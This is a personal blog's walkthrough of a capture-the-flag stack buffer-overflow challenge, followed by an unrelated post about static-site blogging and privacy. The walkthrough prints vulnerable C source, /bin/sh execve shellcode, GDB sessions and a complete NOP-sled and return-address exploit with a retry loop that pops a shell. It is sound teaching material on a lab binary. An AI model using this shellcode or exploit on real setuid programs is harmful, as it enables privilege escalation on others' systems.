<p>As mentioned in my last post, I spent some time solving security challenges posted on HackCenter for the Enigma2017 conference. This one (obviously) was to exploit a buffer overflow vulnerability. It was meant to be relatively easy, but sometimes you don&rsquo;t realize the easiest approach first. I&rsquo;ll walk through not just the solution, but the things I tried that <em>didn&rsquo;t</em> work. It was a refresher course in exploitation for me – I&rsquo;ve spent many years on defense research and needed to brush up again. I know that this is a fast walkthrough, but I don&rsquo;t want to try to teach every concept here, since it is a rather basic exercise, and many others have already explained them elsewhere. If you&rsquo;re reading and would like clarification, feel free to hit me up on Twitter.</p>

<h2 id="the-challenge">The Challenge</h2>

<p>They provided a web shell (literally a terminal emulator in your browser, at HackCenter.com) to a Linux host, and they even gave some free shellcode, <code>\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80</code>. You can disassemble this several ways, but a fast and easy way is <a href="https://alexaltea.github.io/capstone.js/">someone else&rsquo;s server running Capstone.js</a>. We observe that it is an <code>execve</code> syscall at the end, and apparently is running <code>/bin/sh</code> to provide a shell. We already <em>have</em> a shell, so there must be something different about this target process they want us to exploit.</p>

<pre><code class="language-assembly">    31 C0   xor eax, eax                # eax = NULL
    F7 E9   imul ecx
    50      push eax                    # the NULL that terminates the string
    68 2F 2F 73 68  push 0x68732f2f     # not a pointer! The string: “h//sh”
    68 2F 62 69 6E  push 0x6e69622f     # not a pointer! The string: “h/bin”

    CD 80   int 0x80                    # syscall()
</code></pre>

<p>Now let&rsquo;s take a look at the shell we are given:</p>

<pre><code class="language-sh">$ uname -a

</code></pre>

<p>Notice the permissions for the <code>overlowme</code> binary include the <a href="https://en.wikipedia.org/wiki/Setuid">SUID access right flag</a>. When you run this binary, it runs as the user <code>hacksports</code>, who is the owner of <code>key</code> and can read it. The goal here is to run arbitrary code in this process and use it to read <code>key</code>. The given shellcode, executed by <code>overflowme</code>, would provide us a shell where we have the ability to read <code>key</code>.</p>

<p>Notice also the last command, which reads out the ASLR setting: 2. That means that we should expect the OS to randomize the layout of the program&rsquo;s memory when it runs (both text <em>and</em> data segments, is what 2 means).</p>

<p>What about the source code they&rsquo;re letting us see?</p>

<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

#include &quot;inspection.h&quot;

void vuln(char *str) {
    char buf[979];
    sprintf(buf, &quot;Hello %s&quot;, str);
    puts(buf);
    fflush(stdout);
    return;
}

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv) {

    if (argc != 2) {
        printf(&quot;Usage: %s [name]\n&quot;, argv[0]);
        return 1;
    }

    be_nice_to_people();
    vuln(argv[1]);
    return 0;
}
</code></pre>

<h2 id="the-vulnerability">The Vulnerability</h2>

<p>This is a stack-based buffer overflow in the sprintf() call. A fixed-length buffer, <code>buf[979]</code> takes a user input of unchecked (and unlimited) length, in the program&rsquo;s first command-line argument. Since <code>buf</code> is on the stack (as it is a local variable to the function <code>vuln</code>), this is a stack-based buffer overflow.</p>

<p>There are many, many guides out there that explain what happens when you overflow a stack-based buffer on a program that was compiled with absolutely no exploit mitigations: your input overwrites the saved return pointer (also on the stack), and the function epilogue&rsquo;s <code>RET</code> instruction transfers code execution to the address that is now part of the overflowed input. So, the attacker decides where execution will go: arbitrary code execution.</p>

<p>Proof of the vulnerability:</p>

<pre><code class="language-sh">$ ./overflowme `perl -e 'print &quot;\x30&quot;x982'`
</code></pre>

<p>or if you prefer Python:</p>

<pre><code class="language-sh">$ ./overflowme `python -c 'print &quot;\x30&quot;*982'`
</code></pre>

<h2 id="the-exploitation">The Exploitation</h2>

<p>Successful exploitation in a real-world scenario would require multiple prerequisite steps, but this is a simplified exploitaiton case. We just need to solve a few things.</p>

<ol>
<li>Determine the offset in the attack input at which it overwrites the stored return pointer. These bytes have to point to where execution should go.</li>
<li>In order to complete step 1, determine the address where execution should go.</li>
</ol>

<p>Let&rsquo;s start with the 2nd thing. Check the process memory map by launching it under GDB and using ProcFS:</p>

<pre><code>(gdb) start
(gdb) shell ps
# ... observe the PID of overflowme, it is 32687
(gdb) shell cat /proc/32687/maps

</code></pre>

<p>The last memory range, <code>[stack]</code> is executable. You would not see this anymore these days, but this makes exploitation easier, it means shellcode in the buffer overflow input itself can run where it exists, directly. So we just need to check where the buffer is on the stack and put the address into the buffer and we&rsquo;re good to go?</p>

<p>Well hold on. Recall that we saw ASLR was enabled in the OS. Let&rsquo;s run it another time and see these maps again.</p>

<p>See that the stack is at a different address. The OS has applied ASLR to the data segments and the shared libraries for <code>libc</code> and <code>ld</code>. However, the entirety of the program binary itself has not moved. That is, apparently <code>overflowme</code> was not even compiled with support for ASLR. Cool!</p>

<p>Our shellcode is on the stack though, and the stack is one of the parts of memory that is moving around on every run. But that&rsquo;s what we need a pointer to! Our only hope, then, is to find an instruction somewhere in the static mappings that jumps execution back to the stack. <em>Note: here is where I tried a number of unnecessary and fruitless solutions, thinking about this like a modern exploit developer (ROP gadgets, trampolines, etc.). If you just want to read the solution, skip to the next section where I &ldquo;Phone a Friend.&rdquo;</em></p>

<p>My goal was to find an &ldquo;instruction gadget&rdquo; within the static mapping that would effectively work as a <code>JMP ESP</code> or <code>CALL ESP</code>. Using <code>hexdump -C | grep FF</code> I looked for <code>FF E4</code> or <code>FF D4</code> sequences. This is an extremely crude way to do this, but keep in mind the binary is very small. Unfortunately, <em>because</em> it&rsquo;s so small, there was also no occurence of either byte sequence.</p>

<p>If any of the general-purpose registers at the time of the function return happen to also hold pointers to the stack range, then we could trampoline through a <code>JMP EAX/EBX/ECX/EDX</code> or <code>CALL EAX/EBX/ECX/EDX</code>, etc. So I also looked for any of these sequences. I found an <code>FF D0 (call EAX)</code>, and a <code>FF D2 (call EDX)</code>! Good, but do we control either of those registers? Check: <code>(gdb) info registers</code>:</p>

<pre><code>eax            0x0      0                         
ebx            0xffa5d5a0       -5909088
ecx            0xf7726878       -143497096
edx            0x0      0
…
esp            0xffa5d56c       0xffa5d56c
ebp            0xffa5d588       0xffa5d588 
</code></pre>

<p>annnnd no, they’re both 0x0 by the time the attacker gets control of <code>EIP</code>. But what&rsquo;s this, <code>EBX</code> points into the stack (verified by another look at the <code>/proc/PID/maps</code>):</p>

<pre><code>ffa3e000-ffa5f000 rwxp 00000000 00:00 0		[stack]  
</code></pre>

<p>But alas, poring over the hexdump of the static mappings in memory, there is no <code>CALL EBX (FF D3)</code> or <code>JMP EBX (FF E3)</code> gadgets! There&rsquo;s not even something more indirect, like a <code>PUSH EBX; RET (53 C3</code>).</p>

<p>Another idea was to try to jump to one of the <code>GOT</code> entries, but this is a tiny little toy binary! It doesn&rsquo;t import anything useful, as we see with <code>objdump -T</code>:</p>

<pre><code>DYNAMIC SYMBOL TABLE:

<p>If there was a <code>system()</code> in here or something it would be a different story maybe, but as is, there are no useful standard library calls in this table.</p>

<p>The ROP approach to this has failed me.</p>

<h2 id="phoning-a-friend">Phoning a Friend</h2>

<p>At this point I called a smart friend of mine for a tip on how to jump the instruction pointer to this stupid shellcode on the stack. We discussed more advanced gadget-finding using Z3 solvers and all sorts of stuff, but ultimately the hints that stuck with me were:</p>

<ul>
<li>Duh, you can stack spray like it&rsquo;s 1992: just make your input 100KB, NOP-sled to the end where shellcode lies, and re-run the exploit until it works by chance (until the input happens to inhabit a range around the address we choose to put in the overflowed return pointer).</li>
<li>You can store an arbitrary amount of NOP-sled in an environment variable and it will all get located in the stack segment.</li>
</ul>

<h2 id="making-it-work">Making It Work</h2>

<p>Okay, so I have a good idea of how to (messily and probabilistically) get a successful exploit. The only thing I skipped over earlier was determining exactly how many bytes offset into the attack input we need to place the pointer. The way you do this is to use an exploit pattern string, such as you can <a href="http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/">generate online here</a> or offline using <a href="https://github.com/Svenito/exploit-pattern/blob/master/pattern.py">various tools</a>, and then watch the value of <code>EIP</code> when the process crashes under GDB:</p>

<pre><code class="language-sh">$ gdb --args ./overflowme Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B

(gdb) ni
# etc ...
(gdb) info registers
# I observe that the bytes from the pattern that fill EIP (little endian, remember) are &quot;g8Bg&quot;.
</code></pre>

<p>I chose a pointer that was in the middlish-range for the stack: 0xff881111, converted it into little-endian order, and put it into the attack string at the same location. We can confirm:</p>

<pre><code class="language-sh">$ gdb --args ./overflowme $(python -c 'print &quot;A&quot;*985 + &quot;\x11\x11\x88\xff&quot;')
(gdb) b vuln
(gdb) run
(gdb) ni
# etc ...
(gdb) info registers
# I observe that EIP is 0xff881111. Maybe it doesn't point into the stack on THIS run but it sometimes will, which is all we need, since we're allowed to retry the attack until it does.
</code></pre>

<p>Putting it all together:</p>

<pre><code class="language-sh"># Store a NOP sled of 0x90 bytes and the shellcode at the end, in the stack via an env. var.:
$ export SHELLCODE=$(python -c 'print &quot;\x90&quot;*100000 + &quot;\x31\xC0\xF7\xE9\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x68\x2D\x69\x69\x69\x89\xE6\x50\x56\x53\x89\xE1\xB0\x0B\xCD\x80&quot;')

# Point to the stack, and keep running the attack until it works: the ol' &quot;spray &amp; pray&quot;
$ for i in {1..100}; do ./overflowme $(python -c 'print &quot;A&quot;*985 + &quot;\x11\x11\x88\xff&quot;'); done

# Boom, it pops a shell:
$ ls
key  overflowme  overflowme.c                                                  
$ cat key

                    <div class="post-description">
                        <p>My first blog, back in the early 2000s, was on a hosted blogging platform known as <a href="https://en.wikipedia.org/wiki/Blogger_(service)">Blogger</a>. It was simple and convenient: as the admin you just logged into the Blogger service, edited posts in your browser, and hit publish. This is basically how Tumblr still works today, although Tumblr&rsquo;s innovation was to include media file hosting and allow everyone to repost each others&rsquo; content.</p>

<p>But Blogger content was <em>static</em>, and textual. You could post a few paragraphs of text, and embed images if they were hosted elsewhere. Only later did Google buy out the service and integrate it with their photo-hosting service. In the mid-2000s, many geeks wanted more flexibility, like the ability to limit access to members only, integrate their own photo/video/audio collections, and – most importantly – control the appearance of their blog.</p>

<p>So my second blog was generated with a Web Content Management System (CMS) and self-hosted on a home Windows XP PC running the &ldquo;<a href="https://en.wikipedia.org/wiki/LAMP_%28software_bundle%29#WAMP">WAMP</a>&rdquo; software stack, with a DNS record from a free dynamic DNS service. If you&rsquo;re a system admin or security expert you&rsquo;re probably cringing. I am too. In hindsight, it&rsquo;s a miracle if that PC was not 0wned by a hacker at some point, but at least I have no evidence to believe it was. But I thought my blog was pretty cool, it had a custom look, custom domain name, its own forums, file storage, a weather widget on the sidebar. I believe it was using the <a href="https://en.wikipedia.org/wiki/Drupal">Drupal CMS</a>. The 2000s saw this rise of the &ldquo;web app,&rdquo; a concept that an application was something that ran in a scripting language on a web server and presented you with a web page as the user interface. As a system programmer who thinks an application is a single self-contained compiled binary, I thought this was an anathema. But the rest of the tech world decided otherwise: websites that were not database-backed and server-side-scripted were totally 90s! That meant lame. 90s wasn&rsquo;t cool again yet.</p>

<p>The reason why the self-hosted CMS approach to blogging is cringey is that it is notoriously difficult to secure a CMS, especially one written in PHP. PHP is now known to be prone to reoccuring security issues because of flaws in its design (unvalidated input, access control problems, command injection issues, etc.), and the use of a SQL database means fighting a war agains SQL injection attacks from anyone who uses your site. Spammers will leave spam comments. You just want to run a blog, but now you&rsquo;re a system admin for a web server, a database admin for a database, and you have to understand the PHP (or Java, or whatever) that generates your site on the fly every time a visitor loads a page. If you ever want to use a web hosting service for your CMS-based site instead of hosting it at home, you have to pay real money, because supporting and securing Apache, PHP, and MySQL is a full-time job! On top of all of that, all of this script and database stuff makes the site is slower to load, and prone to Denial of Service attacks.</p>

<p>This is no way to live. And so, as is typical, the tech community decided that what is old is new again, and that static sites were actually a good idea that should never have been abandoned. Rolling my eyes so hard I went temporarily blind, I actually resisted even caring about the cool way to blog in the 2010s. I used LiveJournal for a bit. I tried a hosted Wordpress (Wordpress.com) account to blog about game console emulators. I got into using Tumblr, even though (or maybe <em>because</em>) the tech community is not on there. But now I&rsquo;ve decided to give a fresh look at what&rsquo;s fresh, and give it a chance.</p>

<p>Here are some things I noticed about the current Preferred Way for Cool Kids to Blog.</p>

<ul>
<li>If you write any kind of code for a living, you host it on a free hosting service in the .io TLD. This is just what is fashionable, and like all fashion choices, it can&rsquo;t really be explained. &ldquo;Everyone is doing it&rdquo;, including this blog. We are not all hosting sites in the British Indian Ocean Territory, but yes, this TLD exists because the UK <a href="https://en.wikipedia.org/wiki/Depopulation_of_Chagossians_from_the_Chagos_Archipelago">stole some Pacific Islanders&rsquo; land</a> during the Cold War, and its only other claim to fame might be <a href="http://content.time.com/time/world/article/0,8599,1828469,00.html">its black site CIA torture prison</a>. How&rsquo;s that for oblivious Silicon Valley tech privilege!</li>
<li>Because HTML, JS, and CSS are nearly impossible to work in directly anymore (much like assembly code), people write their web page content in a highly simplified markup language, and then run <em>that</em> through a compiler (oh, sorry, <em>static site generator</em>) to produce a web site in actual HTML, JS, and CSS. The output is then posted to a web hosting service. There are some <a href="https://staticsitegenerators.net">450 static site generators</a> to choose from. This site uses Hugo, which I&rsquo;ll talk about in a future post. An even more popular choice is Jekyll, which is fine…for me to poop on.</li>
<li>The simplified markup language of choice currently is <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a>, which will also be the subject of a future post because it is pretty neat.</li>
<li>Because supporting the ability for visitors to post comments would require a dynamic site, static sites have outsourced this responsibility to third-party services. That is, comments are implemented with an embedded JavaScript element that is loaded from a remote service. The dominant choice of service at the moment is <a href="https://en.wikipedia.org/wiki/Disqus">Disqus</a>. This and any other user-account-based service that embeds its content on your blog is a privacy problem: it means Disqus is basically assigning you an identifier and following you around to all of the Disqus-enabled sites you visit. <a href="https://www.ghostery.com">Ghostery</a> blocks Disqus by default, for this reason. I suggest using Twitter to reach me if you have a comment.</li>
<li>Because static sites cannot track how many visitors they get and where they visited from, that too has been outsourced. <a href="https://en.wikipedia.org/wiki/Google_Analytics">Google Analytics</a> is now more prevalent than HPV and herpes combined. I have had to delete it out of every web-related code repository that I have borrowed to make anything. Even if I&rsquo;m the last one on Earth who cares about privacy, I will not be including that here. The same goes for social media sharing links. You&rsquo;re a big boy and/or girl, I bet you&rsquo;ll figure out how to share a URL yourself!</li>
</ul>

<p>So there you have it, my take on the Way to Blog in the 2010s for Cool Kids. Thanks for reading. – MM</p>
